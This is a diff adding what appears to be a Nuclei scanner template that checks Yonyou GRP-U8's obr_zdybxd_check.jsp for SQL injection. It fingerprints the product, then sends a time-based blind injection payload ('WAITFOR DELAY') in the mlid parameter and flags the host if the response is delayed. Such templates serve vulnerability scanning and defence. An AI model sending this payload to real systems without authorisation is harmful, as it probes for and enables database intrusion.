@@ -1,0 +1,48 @@
+id: poc-yaml-yongyou-grp-u8-obr-zdybxd-check-jsp-sqli
+
+info:
+  name: 用友GRP-U8 obr_zdybxd_check.jsp SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    SQL injection vulnerability in 用友GRP-U8 obr_zdybxd_check.jsp that can lead to arbitrary database queries.
+
+variables:
+  t1: '{{rand_int(5, 10)}}'
+  t2: '{{to_number(t1) + 1}}'
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "GRP-U8"
+
+  - raw:
+      - |
+        GET /u8qx/obr_zdybxd_check.jsp?mlid=1%27;WAITFOR%20DELAY%20%270:0:{{t1}}%27-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: body
+        regex:
+          - "^[^<]*$"
+      - type: dsl
+        dsl:
+          - "duration >= to_number(t1)"
+          - "duration < to_number(t2)"
